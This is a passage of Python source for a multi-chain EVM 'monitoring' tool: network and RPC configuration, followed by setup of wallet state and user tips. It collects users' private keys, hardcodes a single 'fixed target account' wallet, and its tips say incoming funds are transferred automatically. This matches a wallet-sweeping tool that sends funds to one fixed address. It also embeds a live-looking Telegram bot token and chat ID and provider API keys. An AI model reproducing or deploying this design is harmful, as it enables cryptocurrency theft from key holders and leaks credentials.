                    'https://andromeda.metis.io/?owner=1088',
                    'https://metis.publicnode.com',
                    'https://rpc.ankr.com/metis',
                    'https://metis.llamarpc.com'
                ],
                'native_currency': 'METIS',
                'explorer': 'https://andromeda-explorer.metis.io'
            },
            
            'mode': {
                'name': '🟣 Mode',
                'chain_id': 34443,
                'rpc_urls': [
                    'https://mainnet.mode.network',
                    'https://mode.gateway.tenderly.co',
                    'https://1rpc.io/mode'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://explorer.mode.network'
            },
            
            'optimism': {
                'name': '🔴 Optimism',
                'chain_id': 10,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://optimism.publicnode.com',
                    'https://optimism.blockpi.network/v1/rpc/public',
                    'https://mainnet.optimism.io',
                    'https://optimism.llamarpc.com',
                    'https://optimism.drpc.org',
                    'https://endpoints.omniatech.io/v1/op/mainnet/public',
                    'https://1rpc.io/op',
                    # ALCHEMY (备用)
                    f'https://opt-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr (最后备用)
                    f'https://rpc.ankr.com/optimism/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://optimistic.etherscan.io'
            },
            
            'opbnb': {
                'name': '🟡 opBNB',
                'chain_id': 204,
                'rpc_urls': [
                    'https://opbnb-mainnet-rpc.bnbchain.org',
                    'https://opbnb.publicnode.com',
                    'https://1rpc.io/opbnb'
                ],
                'native_currency': 'BNB',
                'explorer': 'https://opbnbscan.com'
            },
            
            'polygon_zkevm': {
                'name': '🔺 Polygon zkEVM',
                'chain_id': 1101,
                'rpc_urls': [
                    f'https://polygonzkevm-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://zkevm-rpc.com'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://zkevm.polygonscan.com'
            },
            
            'scroll': {
                'name': '📜 Scroll',
                'chain_id': 534352,
                'rpc_urls': [
                    'https://rpc.scroll.io',
                    'https://scroll.llamarpc.com',
                    'https://scroll.publicnode.com'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://scrollscan.com'
            },
            
            'taiko': {
                'name': '🥁 Taiko',
                'chain_id': 167000,
                'rpc_urls': [
                    'https://rpc.mainnet.taiko.xyz',
                    'https://taiko.blockpi.network/v1/rpc/public'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://taikoscan.io'
            },
            
            # ==== 💎 新增重要Layer 2链条 ====
            'immutable_zkevm': {
                'name': '🎮 Immutable zkEVM',
                'chain_id': 13371,
                'rpc_urls': [
                    'https://rpc.immutable.com',
                    'https://immutable-zkevm.drpc.org'
                ],
                'native_currency': 'IMX',
                'explorer': 'https://explorer.immutable.com'
            },
            
            'kinto': {
                'name': '🔷 Kinto',
                'chain_id': 7887,
                'rpc_urls': [
                    'https://rpc.kinto-rpc.com',
                    'https://kinto.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://kintoscan.io'
            },
            
            'neon_evm': {
                'name': '🟢 Neon EVM',
                'chain_id': 245022934,
                'rpc_urls': [
                    'https://neon-proxy-mainnet.solana.p2p.org',
                    'https://neon-mainnet.everstake.one'
                ],
                'native_currency': 'NEON',
                'explorer': 'https://neonscan.org'
            },
            
            'palm': {
                'name': '🌴 Palm',
                'chain_id': 11297108109,
                'rpc_urls': [
                    'https://palm-mainnet.infura.io/v3/3a961d6501e54add9a41aa53f15de99b',
                    'https://palm-mainnet.public.blastapi.io'
                ],
                'native_currency': 'PALM',
                'explorer': 'https://explorer.palm.io'
            },
            
            'rari': {
                'name': '💎 Rari Chain',
                'chain_id': 1380012617,
                'rpc_urls': [
                    'https://mainnet.rpc.rarichain.org/http'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://mainnet.explorer.rarichain.org'
            },
            
            'x_layer': {
                'name': '❌ X Layer',
                'chain_id': 196,
                'rpc_urls': [
                    'https://rpc.xlayer.tech',
                    'https://xlayerrpc.okx.com'
                ],
                'native_currency': 'OKB',
                'explorer': 'https://www.oklink.com/xlayer'
            },
            
            'xrpl_evm': {
                'name': '🔗 XRPL EVM Sidechain',
                'chain_id': 1440002,
                'rpc_urls': [
                    'https://rpc-evm-sidechain.xrpl.org',
                    'https://xrpl-evm.drpc.org'
                ],
                'native_currency': 'eXRP',
                'explorer': 'https://evm-sidechain.xrpl.org'
            },
            
            'zkfair': {
                'name': '⚖️ ZKFair',
                'chain_id': 42766,
                'rpc_urls': [
                    'https://rpc.zkfair.io',
                    'https://zkfair-mainnet.drpc.org'
                ],
                'native_currency': 'USDC',
                'explorer': 'https://scan.zkfair.io'
            },
            
            'zklink_nova': {
                'name': '🔗 ZKLink Nova',
                'chain_id': 810180,
                'rpc_urls': [
                    'https://rpc.zklink.io',
                    'https://zklink-nova.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://explorer.zklink.io'
            },
            
            'zora': {
                'name': '🎨 Zora Network',
                'chain_id': 7777777,
                'rpc_urls': [
                    'https://rpc.zora.energy',
                    'https://zora.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://explorer.zora.energy'
            },
            
            'zksync': {
                'name': '⚡ zkSync Era',
                'chain_id': 324,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://mainnet.era.zksync.io',
                    'https://zksync.llamarpc.com',
                    'https://zksync.drpc.org',
                    'https://zksync-era.blockpi.network/v1/rpc/public',
                    'https://endpoints.omniatech.io/v1/zksync-era/mainnet/public',
                    'https://1rpc.io/zksync2-era',
                    'https://zksync.meowrpc.com',
                    # ALCHEMY (备用)
                    f'https://zksync-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr (最后备用)
                    f'https://rpc.ankr.com/zksync_era/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://explorer.zksync.io'
            },
            
            # ==== 🔮 更多Layer 2网络 ====
            'astar_zkevm': {
                'name': '🌟 Astar zkEVM',
                'chain_id': 3776,
                'rpc_urls': [
                    'https://rpc.startale.com/astar-zkevm'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://astar-zkevm.explorer.startale.com'
            },
            
            'carbon': {
                'name': '⚫ Carbon',
                'chain_id': 9790,
                'rpc_urls': [
                    'https://rpc.carbon.network'
                ],
                'native_currency': 'SWTH',
                'explorer': 'https://scan.carbon.network'
            },
            
            'cyber': {
                'name': '🤖 Cyber',
                'chain_id': 7560,
                'rpc_urls': [
                    'https://cyber.alt.technology',
                    'https://rpc.cyber.co'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://cyberscan.co'
            },
            
            'fraxtal': {
                'name': '🧊 Fraxtal',
                'chain_id': 252,
                'rpc_urls': [
                    'https://rpc.frax.com'
                ],
                'native_currency': 'frxETH',
                'explorer': 'https://fraxscan.com'
            },
            
            'kroma': {
                'name': '🎨 Kroma',
                'chain_id': 255,
                'rpc_urls': [
                    'https://api.kroma.network'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://kromascan.com'
            },
            
            'lightlink': {
                'name': '💡 LightLink',
                'chain_id': 1890,
                'rpc_urls': [
                    'https://replicator.pegasus.lightlink.io/rpc/v1'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://pegasus.lightlink.io'
            },
            
            'lisk': {
                'name': '🔷 Lisk',
                'chain_id': 1135,
                'rpc_urls': [
                    'https://rpc.api.lisk.com'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://blockscout.lisk.com'
            },
            
            'merlin_chain': {
                'name': '🧙‍♂️ Merlin Chain',
                'chain_id': 4200,
                'rpc_urls': [
                    'https://rpc.merlinchain.io',
                    'https://merlin.blockpi.network/v1/rpc/public'
                ],
                'native_currency': 'BTC',
                'explorer': 'https://scan.merlinchain.io'
            },
            
            'oasys': {
                'name': '🎮 Oasys',
                'chain_id': 248,
                'rpc_urls': [
                    'https://rpc.mainnet.oasys.games'
                ],
                'native_currency': 'OAS',
                'explorer': 'https://scan.oasys.games'
            },
            
            'playdapp': {
                'name': '🎯 PlayDapp Network',
                'chain_id': 504441,
                'rpc_urls': [
                    'https://subnets.avax.network/playdappne/mainnet/rpc'
                ],
                'native_currency': 'PDA',
                'explorer': 'https://subnets.avax.network/playdappne'
            },
            
            'redbellynetwork': {
                'name': '🔴 Redbelly Network',
                'chain_id': 151,
                'rpc_urls': [
                    'https://governors.mainnet.redbelly.network'
                ],
                'native_currency': 'RBNT',
                'explorer': 'https://explorer.redbelly.network'
            },
            
            'ronin': {
                'name': '⚔️ Ronin',
                'chain_id': 2020,
                'rpc_urls': [
                    'https://api.roninchain.com/rpc',
                    'https://rpc.ankr.com/ronin'
                ],
                'native_currency': 'RON',
                'explorer': 'https://app.roninchain.com'
            },
            
            'stratis': {
                'name': '🔷 Stratis EVM',
                'chain_id': 105105,
                'rpc_urls': [
                    'https://rpc.stratisevm.com'
                ],
                'native_currency': 'STRAX',
                'explorer': 'https://explorer.stratisevm.com'
            },
            
            # ==== 🧪 测试网络 (按首字母排序) ====
            'arbitrum_sepolia': {
                'name': '🧪 Arbitrum Sepolia',
                'chain_id': 421614,
                'rpc_urls': [
                    f'https://arb-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://sepolia-rollup.arbitrum.io/rpc'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://sepolia.arbiscan.io'
            },
            
            'base_sepolia': {
                'name': '🧪 Base Sepolia',
                'chain_id': 84532,
                'rpc_urls': [
                    f'https://base-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://sepolia.base.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://sepolia.basescan.org'
            },
            
            'blast_sepolia': {
                'name': '🧪 Blast Sepolia',
                'chain_id': 168587773,
                'rpc_urls': [
                    f'https://blast-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://sepolia.blast.io'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://testnet.blastscan.io'
            },
            
            'ethereum_holesky': {
                'name': '🧪 Ethereum Holesky',
                'chain_id': 17000,
                'rpc_urls': [
                    f'https://eth-holesky.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://holesky.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://holesky.etherscan.io'
            },
            
            'ethereum_sepolia': {
                'name': '🧪 Ethereum Sepolia',
                'chain_id': 11155111,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://sepolia.publicnode.com',
                    'https://rpc.sepolia.org',
                    'https://sepolia.blockpi.network/v1/rpc/public',
                    'https://ethereum-sepolia.blockpi.network/v1/rpc/public',
                    'https://sepolia.drpc.org',
                    'https://endpoints.omniatech.io/v1/eth/sepolia/public',
                    'https://1rpc.io/sepolia',
                    'https://rpc-sepolia.rockx.com',
                    # ALCHEMY (备用)
                    f'https://eth-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr (最后备用)
                    f'https://rpc.ankr.com/eth_sepolia/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://sepolia.etherscan.io'
            },
            
            'optimism_sepolia': {
                'name': '🧪 Optimism Sepolia',
                'chain_id': 11155420,
                'rpc_urls': [
                    f'https://opt-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://sepolia.optimism.io'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://sepolia-optimistic.etherscan.io'
            },
            
            'polygon_amoy': {
                'name': '🧪 Polygon Amoy',
                'chain_id': 80002,
                'rpc_urls': [
                    f'https://polygon-amoy.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://rpc-amoy.polygon.technology'
                ],
                'native_currency': 'MATIC',
                'explorer': 'https://amoy.polygonscan.com'
            },
            
            'polygon_zkevm_testnet': {
                'name': '🧪 Polygon zkEVM Testnet',
                'chain_id': 1442,
                'rpc_urls': [
                    f'https://polygonzkevm-testnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://rpc.public.zkevm-test.net'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://testnet-zkevm.polygonscan.com'
            },
            
            'zksync_sepolia': {
                'name': '🧪 zkSync Sepolia',
                'chain_id': 300,
                'rpc_urls': [
                    f'https://zksync-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://sepolia.era.zksync.dev'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://sepolia.explorer.zksync.io'
            },
            
            # ==== 💎 新增重要测试网 ====
            'berachain_testnet': {
                'name': '🧪 Berachain Testnet',
                'chain_id': 80085,
                'rpc_urls': [
                    'https://bartio.rpc.berachain.com',
                    'https://bera-testnet.nodeinfra.com',
                    'https://bartio.rpc.b-harvest.io',
                    'https://bera-testnet-rpc.publicnode.com',
                    # Alchemy (付费)
                    f'https://berachain-bartio.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}'
                ],
                'native_currency': 'BERA',
                'explorer': 'https://bartio.beratrail.io'
            },
            
            'gravity_testnet': {
                'name': '🧪 Gravity Testnet',
                'chain_id': 13505,
                'rpc_urls': [
                    'https://rpc-sepolia.gravity.xyz',
                    'https://gravity-testnet.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://explorer-sepolia.gravity.xyz'
            },
            
            'immutable_zkevm_testnet': {
                'name': '🧪 Immutable zkEVM Testnet',
                'chain_id': 13473,
                'rpc_urls': [
                    'https://rpc.testnet.immutable.com',
                    'https://immutable-zkevm-testnet.drpc.org'
                ],
                'native_currency': 'tIMX',
                'explorer': 'https://explorer.testnet.immutable.com'
            },
            
            'linea_testnet': {
                'name': '🧪 Linea Testnet',
                'chain_id': 59140,
                'rpc_urls': [
                    'https://rpc.goerli.linea.build',
                    'https://linea-testnet.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://goerli.lineascan.build'
            },
            
            'manta_pacific_testnet': {
                'name': '🧪 Manta Pacific Testnet',
                'chain_id': 3441005,
                'rpc_urls': [
                    'https://manta-testnet.calderachain.xyz/http',
                    'https://manta-pacific-testnet.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://manta-testnet.calderaexplorer.xyz'
            },
            
            'mantra_testnet': {
                'name': '🧪 MANTRA Testnet',
                'chain_id': 3363,
                'rpc_urls': [
                    'https://rpc.testnet.mantrachain.io',
                    'https://mantra-testnet.drpc.org',
                    'https://evm.dukong.mantrachain.io',
                    'https://mantra-testnet-rpc.publicnode.com',
                    'https://mantra-testnet-rpc.itrocket.net'
                ],
                'native_currency': 'OM',
                'explorer': 'https://explorer.testnet.mantrachain.io'
            },
            
            'mode_testnet': {
                'name': '🧪 Mode Testnet',
                'chain_id': 919,
                'rpc_urls': [
                    'https://sepolia.mode.network',
                    'https://mode-testnet.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://sepolia.explorer.mode.network'
            },
            
            'monad_testnet': {
                'name': '🧪 Monad Testnet',
                'chain_id': 41454,
                'rpc_urls': [
                    'https://testnet1.monad.xyz'
                ],
                'native_currency': 'MON',
                'explorer': 'https://testnet1.explorer.monad.xyz'
            },
            
            'scroll_testnet': {
                'name': '🧪 Scroll Sepolia',
                'chain_id': 534351,
                'rpc_urls': [
                    'https://sepolia-rpc.scroll.io',
                    'https://scroll-testnet.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://sepolia.scrollscan.com'
            },
            
            'taiko_testnet': {
                'name': '🧪 Taiko Hekla',
                'chain_id': 167009,
                'rpc_urls': [
                    'https://rpc.hekla.taiko.xyz',
                    'https://taiko-hekla.drpc.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://hekla.taikoscan.network'
            },
            
            'zkfair_testnet': {
                'name': '🧪 ZKFair Testnet',
                'chain_id': 43851,
                'rpc_urls': [
                    'https://testnet-rpc.zkfair.io'
                ],
                'native_currency': 'USDC',
                'explorer': 'https://testnet-scan.zkfair.io'
            },
            
            # ==== 🔥 更多测试网 ====
            'aurora_testnet': {
                'name': '🧪 Aurora Testnet',
                'chain_id': 1313161555,
                'rpc_urls': [
                    'https://testnet.aurora.dev'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://testnet.aurorascan.dev'
            },
            
            'avalanche_fuji': {
                'name': '🧪 Avalanche Fuji',
                'chain_id': 43113,
                'rpc_urls': [
                    'https://api.avax-test.network/ext/bc/C/rpc',
                    'https://rpc.ankr.com/avalanche_fuji'
                ],
                'native_currency': 'AVAX',
                'explorer': 'https://testnet.snowtrace.io'
            },
            
            'bsc_testnet': {
                'name': '🧪 BNB Smart Chain Testnet',
                'chain_id': 97,
                'rpc_urls': [
                    'https://data-seed-prebsc-1-s1.binance.org:8545',
                    'https://data-seed-prebsc-2-s1.binance.org:8545',
                    'https://bsc-testnet.publicnode.com'
                ],
                'native_currency': 'tBNB',
                'explorer': 'https://testnet.bscscan.com'
            },
            
            'celo_alfajores': {
                'name': '🧪 Celo Alfajores',
                'chain_id': 44787,
                'rpc_urls': [
                    'https://alfajores-forno.celo-testnet.org',
                    'https://celo-alfajores.infura.io/v3/YOUR-PROJECT-ID'
                ],
                'native_currency': 'CELO',
                'explorer': 'https://alfajores-blockscout.celo-testnet.org'
            },
            
            'conflux_testnet': {
                'name': '🧪 Conflux eSpace Testnet',
                'chain_id': 71,
                'rpc_urls': [
                    'https://evmtestnet.confluxrpc.com'
                ],
                'native_currency': 'CFX',
                'explorer': 'https://evmtestnet.confluxscan.net'
            },
            
            'cronos_testnet': {
                'name': '🧪 Cronos Testnet',
                'chain_id': 338,
                'rpc_urls': [
                    'https://evm-t3.cronos.org'
                ],
                'native_currency': 'TCRO',
                'explorer': 'https://testnet.cronoscan.com'
            },
            
            'fantom_testnet': {
                'name': '🧪 Fantom Testnet',
                'chain_id': 4002,
                'rpc_urls': [
                    'https://rpc.testnet.fantom.network',
                    'https://rpc.ankr.com/fantom_testnet'
                ],
                'native_currency': 'FTM',
                'explorer': 'https://testnet.ftmscan.com'
            },
            

            
            'harmony_testnet': {
                'name': '🧪 Harmony Testnet',
                'chain_id': 1666700000,
                'rpc_urls': [
                    'https://api.s0.b.hmny.io'
                ],
                'native_currency': 'ONE',
                'explorer': 'https://explorer.testnet.harmony.one'
            },
            
            'heco_testnet': {
                'name': '🧪 HECO Testnet',
                'chain_id': 256,
                'rpc_urls': [
                    'https://http-testnet.hecochain.com'
                ],
                'native_currency': 'HT',
                'explorer': 'https://testnet.hecoinfo.com'
            },
            
            'kava_testnet': {
                'name': '🧪 Kava Testnet',
                'chain_id': 2221,
                'rpc_urls': [
                    'https://evm.testnet.kava.io'
                ],
                'native_currency': 'KAVA',
                'explorer': 'https://explorer.testnet.kava.io'
            },
            
            'klaytn_baobab': {
                'name': '🧪 Klaytn Baobab',
                'chain_id': 1001,
                'rpc_urls': [
                    'https://public-node-api.klaytnapi.com/v1/baobab'
                ],
                'native_currency': 'KLAY',
                'explorer': 'https://baobab.scope.klaytn.com'
            },
            
            'moonbase_alpha': {
                'name': '🧪 Moonbase Alpha',
                'chain_id': 1287,
                'rpc_urls': [
                    'https://rpc.api.moonbase.moonbeam.network'
                ],
                'native_currency': 'DEV',
                'explorer': 'https://moonbase.moonscan.io'
            },
            

            
            'okx_testnet': {
                'name': '🧪 OKX Chain Testnet',
                'chain_id': 65,
                'rpc_urls': [
                    'https://exchaintestrpc.okex.org'
                ],
                'native_currency': 'OKT',
                'explorer': 'https://www.oklink.com/okc-test'
            },
            

            
            'sepolia': {
                'name': '🧪 Ethereum Sepolia',
                'chain_id': 11155111,
                'rpc_urls': [
                    'https://sepolia.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
                    'https://rpc.ankr.com/eth_sepolia'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://sepolia.etherscan.io'
            }

        }
        
        # 状态变量
        self.wallets: Dict[str, str] = {}  # address -> private_key
        self.target_wallet = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"  # 固定目标账户
        self.monitored_addresses: Dict[str, Dict] = {}  # address -> {networks: [...], last_check: timestamp}
        self.blocked_networks: Dict[str, List[str]] = {}  # address -> [被屏蔽的网络列表]
        self.monitoring = False
        self.monitor_thread = None
        
        # 网络连接状态管理
        self.connections: Dict[str, Dict] = {}  # network_key -> {web3: Web3实例, rpc_url: str, status: str, last_test: timestamp}
        self.connection_status: Dict[str, bool] = {}  # network_key -> 连接状态
        self.active_rpcs: Dict[str, str] = {}  # network_key -> 当前使用的RPC URL
        
        # 智能调速控制器 - 全自动启用
        self.throttler = SmartThrottler()
        self.throttler_enabled = True  # 默认启用，全自动模式
        
        # 智能缓存系统
        self.cache = SmartCache()
        
        # 数据同步锁 - 确保多线程安全
        self._data_lock = threading.RLock()
        self._connection_lock = threading.RLock()
        self._wallet_lock = threading.RLock()
        
        # 启动时自动优化
        self._auto_optimize_on_startup()
        
        # 守护进程和稳定性相关
        self.restart_count = 0  # 重启次数
        self.last_restart_time = 0  # 最后重启时间
        self.max_restarts = 10  # 最大重启次数
        self.restart_interval = 300  # 重启间隔（秒）
        self.memory_cleanup_interval = 3600  # 内存清理间隔（秒）
        self.last_memory_cleanup = time.time()  # 最后内存清理时间
        self.error_count = 0  # 错误计数
        self.max_errors = 50  # 最大错误数，超过后触发清理
        self.daemon_mode = False  # 是否为守护进程模式
        
        # 文件路径
        self.wallet_file = "wallets.json"
        self.state_file = "monitor_state.json"
        self.log_file = "monitor.log"
        
        # 配置参数
        self.monitor_interval = 30  # 监控间隔（秒）
        self.min_transfer_amount = 0.001  # 最小转账金额（ETH）
        self.gas_limit = 21000
        self.gas_price_gwei = 20
        
        # RPC延迟监控配置
        self.max_rpc_latency = 5.0  # 最大允许延迟（秒）
        self.rpc_latency_checks = 3  # 连续检查次数
        self.rpc_latency_history: Dict[str, List[float]] = {}  # URL -> [延迟历史]
        self.blocked_rpcs: Dict[str, Dict] = {}  # URL -> {reason, blocked_time, network}
        
        # Telegram通知配置
        self.telegram_bot_token = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
        self.telegram_chat_id = "5963704377"
        self.telegram_enabled = True
        
        # Telegram降噪与重试配置
        self.telegram_max_retries = 3
        self.telegram_base_backoff = 1.0  # 秒
        self.telegram_noise_cooldown = 30.0  # 相同内容在该窗口内仅发送一次
        self._telegram_last_sent: Dict[str, float] = {}
        
        # 安全配置
        self.redact_patterns = [
            r"0x[a-fA-F0-9]{64}",  # 可能的私钥/签名
            r"[a-fA-F0-9]{64}",    # 64位十六进制字符串（私钥等）
        ]

        # RPC评分与排序配置
        # 维护每网络的RPC统计，用于动态排序
        # 格式：self.rpc_stats[network_key][rpc_url] = {
        #   'success': int, 'fail': int, 'latencies': [float], 'last_fail': ts
        # }
        self.rpc_stats: Dict[str, Dict[str, Dict]] = {}
        self.rpc_score_window = 50  # 仅保留最近N次
        self.rpc_slow_threshold = 2.0  # 秒，计入慢请求
        self.rpc_p95_weight = 0.6
        self.rpc_success_weight = 0.4

        # 可运行时更新的私有RPC特征列表
        self.private_rpc_indicators: List[str] = [
            'alchemy.com', 'ankr.com', 'infura.io', 'moralis.io',
            'quicknode.com', 'getblock.io', 'nodereal.io'
        ]

        # 初始化智能缓存系统
        self.smart_cache = SmartCache()
        
        # 用户体验优化配置
        self.user_preferences = {
            'auto_confirm_actions': False,      # 自动确认常见操作
            'show_advanced_options': False,    # 显示高级选项
            'remember_choices': True,          # 记住用户选择
            'quick_navigation': True,          # 快速导航模式
            'smart_defaults': True,            # 智能默认值
            'progress_indicators': True,       # 显示进度指示器
            'enhanced_tips': True              # 增强提示信息
        }
        
        # 智能选择历史
        self.choice_history = defaultdict(list)  # 记录用户选择历史
        self.popular_choices = {}  # 流行选择统计
        
        # 操作计时器
        self.operation_timers = {}
        
        # 代币扫描与元数据缓存优化（使用智能缓存）
        # 向后兼容保留原有缓存，但优先使用智能缓存
        self.token_metadata_cache: Dict[str, Dict] = {}
        
        # 用户主动添加的代币符号（大写），用于优先扫描
        self.user_added_tokens: set = set()
        
        # 最近活跃代币记录：address -> network -> token_symbol -> last_seen_timestamp
        self.active_tokens: Dict[str, Dict[str, Dict[str, float]]] = {}
        
        # 活跃代币保留时长（小时），超过时长将不再参与优先扫描
        self.active_token_ttl_hours = 24
        
        # 按地址记录是否已经完成第一次全量扫描
        self.address_full_scan_done: Dict[str, bool] = {}
        self.last_full_scan_time = 0.0
        
        # 数据备份配置
        self.backup_max_files = 5  # 保留最近N个备份
        self.backup_interval_hours = 6  # 每N小时备份一次
        self.last_backup_time = 0.0

        # 转账统计
        self.transfer_stats = {
            'total_attempts': 0,
            'successful_transfers': 0,
            'failed_transfers': 0,
            'total_value_transferred': 0.0,
            'last_reset': time.time(),
            'by_network': {},
            'by_token': {}
        }
        
        # RPC检测结果缓存，避免重复检测
        self.rpc_test_cache = {}  # network_key -> {'last_test': timestamp, 'results': {rpc_url: bool}}
        self.rpc_cache_ttl = 300  # 缓存5分钟
        
        # 设置日志
        self.setup_logging()
        
        # Web3连接 - 保持向后兼容性
        self.web3_connections: Dict[str, Web3] = {}
        # 不在初始化时自动连接网络，由用户手动管理
        # self.init_web3_connections()
        
        # 确保所有必要的数据结构都存在
        self._ensure_data_structures()
        
        # 智能默认值系统
        self.smart_defaults = {
            'monitor_interval': self._get_smart_monitor_interval,
            'gas_price': self._get_smart_gas_price,
            'min_transfer': self._get_smart_min_transfer,
            'network_timeout': self._get_smart_network_timeout
        }
        
        # 自动化选项配置
        self.automation_configs = {
            'auto_retry_failed_operations': True,
            'auto_optimize_gas_price': True,
            'auto_refresh_rpc_connections': True,
            'auto_cache_frequently_used_data': True,
            'auto_suggest_improvements': True
        }
        
        print(f"{Fore.CYAN}🔗 EVM智能监控软件已初始化{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✨ 智能缓存、用户体验优化已启用{Style.RESET_ALL}")
        
        # 加载用户设置
        self._load_user_settings()

    def setup_logging(self):
        """设置日志系统"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.log_file, encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def start_operation_timer(self, operation_name: str):
        """开始操作计时"""
        self.operation_timers[operation_name] = time.time()
    
    def end_operation_timer(self, operation_name: str) -> float:
        """结束操作计时并返回耗时"""
        if operation_name in self.operation_timers:
            duration = time.time() - self.operation_timers[operation_name]
            del self.operation_timers[operation_name]
            return duration
        return 0.0
    
    def record_user_choice(self, menu_name: str, choice: str):
        """记录用户选择"""
        if not self.user_preferences.get('remember_choices', True):
            return
        
        self.choice_history[menu_name].append({
            'choice': choice,
            'timestamp': time.time()
        })
        
        # 保持历史记录在合理范围内
        if len(self.choice_history[menu_name]) > 20:
            self.choice_history[menu_name] = self.choice_history[menu_name][-20:]
        
        # 更新流行选择统计
        key = f"{menu_name}:{choice}"
        self.popular_choices[key] = self.popular_choices.get(key, 0) + 1
    
    def get_smart_default(self, menu_name: str, choices: list) -> str:
        """获取智能默认选择"""
        if not self.user_preferences.get('smart_defaults', True):
            return choices[0] if choices else ""
        
        # 优先使用用户历史选择
        if menu_name in self.choice_history:
            recent_choices = [h['choice'] for h in self.choice_history[menu_name][-5:]]
            if recent_choices:
                # 返回最近最常用的选择
                from collections import Counter
                most_common = Counter(recent_choices).most_common(1)
                if most_common and most_common[0][0] in [str(i) for i in range(len(choices))]:
                    return most_common[0][0]
        
        # 否则使用全局流行选择
        menu_popularity = {k.split(':')[1]: v for k, v in self.popular_choices.items() 
                          if k.startswith(f"{menu_name}:")}
        if menu_popularity:
            most_popular = max(menu_popularity.items(), key=lambda x: x[1])
            if most_popular[0] in [str(i) for i in range(len(choices))]:
                return most_popular[0]
        
        return choices[0] if choices else ""
    
    def show_progress_indicator(self, current: int, total: int, operation: str = "处理中"):
        """显示进度指示器"""
        if not self.user_preferences.get('progress_indicators', True):
            return
        
        if total <= 0:
            return
        
        percent = min(100, int((current / total) * 100))
        bar_length = 30
        filled_length = int(bar_length * current // total)
        
        bar = '█' * filled_length + '-' * (bar_length - filled_length)
        
        print(f"\r{Fore.CYAN}🔄 {operation}: |{bar}| {percent}% ({current}/{total}){Style.RESET_ALL}", end='', flush=True)
        
        if current >= total:
            print()  # 完成后换行
    
    def get_enhanced_tips(self, context: str) -> list:
        """获取增强提示信息"""
        if not self.user_preferences.get('enhanced_tips', True):
            return []
        
        tips_database = {
            'main_menu': [
                "💡 新手提示：建议按顺序 1→4→3 完成初始设置",
                "⚡ 效率提示：设置完成后可使用 'q' 快速启动监控",
                "🔄 数据同步：所有设置都会自动保存，重启后自动恢复",
                "🛡️ 安全提示：私钥经过加密存储，请妥善保管密码"
            ],
            'add_wallet': [
                "📋 批量导入：可以一次性粘贴多个私钥，每行一个",
                "✅ 自动验证：系统会自动验证私钥格式并去重",
                "🔐 安全保护：私钥会在本地加密存储"
            ],
            'rpc_testing': [
                "🚀 智能检测：系统会自动测试所有RPC节点的可用性",
                "⚡ 性能优化：优先使用响应速度最快的节点",
                "🔄 自动切换：节点故障时会自动切换到备用节点"
            ],
            'monitoring': [
                "👀 实时监控：系统每30秒检查一次目标地址",
                "💰 智能转账：检测到转入后会自动执行转账策略",
                "📊 详细统计：可查看完整的转账历史和成功率"
            ]
        }
        
        base_tips = tips_database.get(context, [])
        
        # 根据用户使用情况添加个性化提示
        if context == 'main_menu':
            if len(self.wallets) == 0:
                base_tips.insert(0, "🆕 首次使用：请先选择选项 1 添加钱包私钥")
            elif not self.web3_connections:
                base_tips.insert(0, "🔗 建议操作：选择选项 4 初始化网络连接")
            elif not self.monitoring:
